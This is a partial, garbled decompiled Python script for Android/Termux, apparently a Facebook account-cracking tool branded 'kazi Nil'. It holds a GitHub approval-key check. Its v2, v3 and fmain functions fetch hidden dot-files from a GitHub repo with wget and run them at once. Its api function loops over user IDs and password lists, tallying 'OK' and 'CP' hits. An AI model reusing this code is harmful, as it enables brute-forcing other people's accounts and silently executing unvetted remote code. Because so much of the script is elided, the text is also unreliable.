# Decompile by kazi Nil (Tools By kazi Nil)
# Dont ader restiment with kazi Nil
# Decode file /- NA ka. sam 3.11
# DECODE FILE VERSION - V.3.1.1
# WHATSAPP - +8801840261060
import os
import time
os.system("clear")
print("  ==> \033[1;32mTHIS TOOLS DECODE BY kazi Nil")
time.sleep(5)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/nxnil105/Approval.txt/blob/main/Approval.txt"])
...
def notice():
	...
	runtxt("\033[0;92m BYPASS ADMIN Facebook  >> https://www.facebook.com/Captain.TaRikuL.420")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/nxnil105/Approval.txt/blob/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;95m |_____/ \__,_|_| |_|     |_|   \___/ \_/\_/ \___|_|   
	...
	def v2(self):
		if	os.path.isfile('.v2.py'):
			...
			os.system("pip install requests && pip install bs4 && clear && wget https://github.com/nxnil105/Nil-Max/blob/main/.Nil.py && clear && python .Nil.py")
 
		else:
			os.system("pkg install wget -y")
			os.system("wget https://github.com/nxnil105/Nil-Max/blob/main/.v2.py && clear && python .v2.py")
	...
	def v3(self):
		if	os.path.isfile('.v3.py'):
			...
			os.system("pkg install wget -y")
			os.system("wget https://github.com/nxnil105/Nil-Max/blob/main/.v3.py && clear && python .v3.py")
 
	def fmain(self):
		if	os.path.isfile('.fmain.py'):
			os.system("pkg install wget -y")
			os.system("pip install requests && pip install bs4 && clear && wget https://github.com/nxnil105/Nil-Max/blob/main/.fmain.py && clear && python .fmain.py")
 
		else:
			os.system("pkg install wget -y")
			os.system("wget https://github.com/nxnil105/Nil-Max/blob/main/.fmain.py && clear && python .fmain.py")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [samir] : %s/%s -> \033[0;92m [ samir-OK:%s ]- \033[0;91m[BY-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
